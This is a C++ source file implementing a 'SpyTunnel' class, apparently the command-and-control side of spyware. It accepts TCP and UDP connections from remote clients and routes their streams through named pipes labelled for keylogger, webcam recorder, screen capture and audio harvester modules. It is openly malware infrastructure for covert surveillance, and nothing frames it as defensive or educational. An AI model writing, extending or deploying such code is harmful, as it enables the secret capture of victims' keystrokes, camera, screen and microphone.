#include "spy_tunnel.hpp"

int SpyTunnel::init(const std::string& __ip, uint __port, int*& __p_tunnel_shutdown_fd, int __connection_type) {    
    memset(&tunnel_addr_, 0, sizeof(tunnel_addr_));
    tunnel_addr_.sin_family = AF_INET;
    tunnel_addr_.sin_port = htons(__port);
    if (inet_pton(AF_INET, __ip.c_str(), &tunnel_addr_.sin_addr) <= 0) {
        return -1;
    }
    tunnel_socket_ = socket(AF_INET, __connection_type, 0);
    if (tunnel_socket_ == -1) {
        return -1;
    }

    int flags = fcntl(tunnel_socket_, F_GETFL, 0);
    fcntl(tunnel_socket_, F_SETFL, flags | O_NONBLOCK);

    int opt = 1;
    setsockopt(tunnel_socket_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));


    if (bind(tunnel_socket_, (struct sockaddr*)&tunnel_addr_, sizeof(tunnel_addr_)) == -1) {
        close(tunnel_socket_);
        return -1;
    }

    if (__connection_type == TCP_BASED) {
        if (listen(tunnel_socket_, 1) == -1) {
            close(tunnel_socket_);
            return -1;
        }
    }
    __p_tunnel_shutdown_fd = &tunnel_shutdown_fd_.fd;

    return 0;
}

void SpyTunnel::run() {
    pid_ = fork();
    if (pid_ < 0) {
        write_fifo_error("[WebcamRecorder::run] Unable to fork a child process");
    } else if (pid_ == 0) {
        if (tunnel_socket_ != -1) {
            close(tunnel_socket_);
        }
        if (tunnel_end_socket_ != -1) {
            close(tunnel_socket_);
        }
        
        spawn_window();
        _exit(EXIT_FAILURE);
    } 

    int tries = 0;
    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created: " << strerror(errno) << RESET;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    if (tunnel_fifo_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file " << fifo_path_.c_str() << RESET;
        return;
    }

    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
    if (tunnel_shutdown_fd_.fd == -1) {
        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
        return;
    }

    exec_spy();
}

int SpyTunnel::udp_handshake(void* __arg, int __len) {
    ScopedEpollFD epoll_fd;
    int rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        return -1;
    }

    struct epoll_event udp_event;
    udp_event.data.fd = tunnel_socket_;
    udp_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_socket_, &udp_event)) {
        return -1;
    }

    Status handshake;
    memset(&tunnel_end_addr_, 0, sizeof(tunnel_end_addr_));
    tunnel_end_addr_len_ = sizeof(tunnel_end_addr_);
    rc = recvfrom(tunnel_socket_, &handshake, sizeof(Status), 0, (sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
    std::cout << MAGENTA << "[SpyTunnel::udp_handshake] Received hello " << handshake << RESET;
    if (rc < 0) {
        return -1;
    } else if (rc == 0) {
        return -1;
    }

    struct epoll_event events[2];

    // Send the argument and make sure it is received by the other side
    while (true) {
        sendto(tunnel_socket_, __arg, __len, 0, (sockaddr*) &tunnel_end_addr_, tunnel_end_addr_len_);
        std::cout << MAGENTA << "[SpyTunnel::udp_handshake] Sent: " << *static_cast<uint32_t*>(__arg) << " on port:" << ntohs(tunnel_end_addr_.sin_port) << RESET;
       
        int nfds = epoll_wait(epoll_fd.fd, events, 1, 5000);
        if (nfds < 0) {
            return -1;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                // Shutdown 
                uint64_t u;
                recv(tunnel_shutdown_fd_.fd, &u, sizeof(u), 0);
                return -1;
            } else if (events[i].data.fd == tunnel_socket_) {
                rc = recvfrom(tunnel_socket_, &handshake, sizeof(Status), 0, (sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
                std::cout << MAGENTA << "[SpyTunnel::udp_handshake] received handshake " << handshake << RESET;
                if (rc < 0) {
                    return -1;
                } else if (rc == 0) {
                    return -1;
                }
                
                if (rc > 0 && handshake == UDP_ACK) {
                    epoll_ctl(epoll_fd.fd, EPOLL_CTL_DEL, tunnel_shutdown_fd_.fd, nullptr);
                    epoll_ctl(epoll_fd.fd, EPOLL_CTL_DEL, tunnel_socket_, nullptr);
                    return 0;
                }
            } 
        }
    }
}

void SpyTunnel::set_dev(int __dev_num) {
    dev_num_ = static_cast<uint32_t>(__dev_num);
}

void SpyTunnel::set_out(const std::string& __out_name) {
    out_name_ = __out_name;
}

int SpyTunnel::accept_tunnel_end() {
    ScopedEpollFD accept_epoll_fd;
    int rc = create_epoll_fd(accept_epoll_fd);
    if (rc < 0) {
        write_fifo_error("[SpyTunnel::accept_tunnel_end] Error creating epoll" + std::string(strerror(errno)));
        return -1;
    }

    struct epoll_event accept_event;
    accept_event.data.fd = tunnel_socket_;
    accept_event.events = EPOLLIN;
    if (epoll_ctl(accept_epoll_fd.fd, EPOLL_CTL_ADD, tunnel_socket_, &accept_event) == -1) {
        write_fifo_error("[SpyTunnel::accept_tunnel_end] Error adding tunnel socket to epoll " + std::string(strerror(errno)));
        return -1;
    }

    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(accept_epoll_fd.fd, events, 2, -1);
        if (nfds < 0) {
            if (errno == EINTR) {
                continue;
            }
            write_fifo_error("[SpyTunnel::accept_tunnel_end] Error waiting for epoll event " + std::string(strerror(errno)));
            return -1;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                std::cout << MAGENTA << "[SpyTunnel::accept_tunnel_end] Shutdown signal received" << RESET;
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                return -1;
            } else if (events[i].data.fd == tunnel_socket_) {
                tunnel_end_socket_ = accept(tunnel_socket_, nullptr, nullptr);
                if (tunnel_end_socket_ == -1) {
                    write_fifo_error("[SpyTunnel::accept_tunnel_end] Error accepting tunnel end socket " + std::string(strerror(errno)));
                    return -1;
                }
                epoll_ctl(accept_epoll_fd.fd, EPOLL_CTL_DEL, tunnel_shutdown_fd_.fd, nullptr);
                return 0;
            }
        }
    }
    
    return -1;
}

int SpyTunnel::create_epoll_fd(ScopedEpollFD& __epoll_fd) {
    __epoll_fd.fd = epoll_create1(0);
    if (__epoll_fd.fd == -1) {
        write_fifo_error("[SpyTunnel::create_epoll_fd] Error creating epoll instance " + std::string(strerror(errno)));
        return -1;
    }

    struct epoll_event shutdown_event;
    shutdown_event.data.fd = tunnel_shutdown_fd_.fd;
    shutdown_event.events = EPOLLIN;
    if (epoll_ctl(__epoll_fd.fd, EPOLL_CTL_ADD, tunnel_shutdown_fd_.fd, &shutdown_event) == -1) {
        write_fifo_error("[SpyTunnel::create_epoll_fd] Error adding shutdown eventfd to epoll " + std::string(strerror(errno)));
        return -1;
    }

    return 0;
}



void SpyTunnel::edit_fifo_path(int __client_index, CommandCode __command_code) {
    if (__command_code == KEYLOGGER) {
        fifo_path_ = KEYLOGGER_FIFO_PATH + std::to_string(__client_index);
    } else if (__command_code == WEBCAM_RECORDER) {
        fifo_path_ = WEBCAM_RECORDER_FIFO_PATH + std::to_string(__client_index);
    } else if (__command_code == SCREEN_HUNTER) {
        fifo_path_ = SCREEN_HUNTER_FIFO_PATH + std::to_string(__client_index);
    } else if (__command_code == ALSA_HARVESTER) {
        fifo_path_ = ALSA_HARVESTER_FIFO_PATH + std::to_string(__client_index);
    }
}

void SpyTunnel::shutdown() {
    if (pid_ > 0) {
        kill(pid_, SIGTERM);
        waitpid(pid_, nullptr, 0);
    }

    if (tunnel_socket_ != -1) {
        close(tunnel_socket_);
    }

    if (tunnel_end_socket_ != -1) {
        close(tunnel_end_socket_);
    }
}

void SpyTunnel::write_fifo_error(const std::string& __msg) {
    if (tunnel_fifo_ != -1) {
        std::string error = __msg + "[__error__]\n";
        write(tunnel_fifo_, error.c_str(), error.length());
        close(tunnel_fifo_);
        tunnel_fifo_ = -1;
    } else {
        std::cerr << RED << "[SpyTunnel::write_fifo_error] " << __msg << RESET;
    }
}

Tunnel::Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_spy_tunnel) {
    command_code_ = __command_code;
    client_index_ = __client_index;
    p_spy_tunnel_ = __p_spy_tunnel;
    p_tunnel_shutdown_fd_ = nullptr;
}

std::atomic<int> Tunnel::active_tunnels_ = 0;

void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, CommandCode __command_code) {
    auto it = std::remove_if(
        __p_tunnels->begin(), 
        __p_tunnels->end(),
        [=](Tunnel* tunnel) {
            bool should_erase = (tunnel->client_index_ == __client_index && tunnel->command_code_ == __command_code); 
            if (should_erase) {
                std::cout << MAGENTA << "[erase_tunnel] Erasing tunnel with client_index_:command_code " << tunnel->client_index_ << " : " << tunnel->command_code_ << RESET;
                delete tunnel->p_spy_tunnel_;
                delete tunnel;
            }
            return should_erase;
        }
    );
    __p_tunnels->erase(it, __p_tunnels->end()); // Reorganize the vector
}

void SpyTunnel::spawn_window() {
    // Overridden
}

void SpyTunnel::exec_spy() {
    // Overridden
}

SpyTunnel::~SpyTunnel() {} // Enable RTTI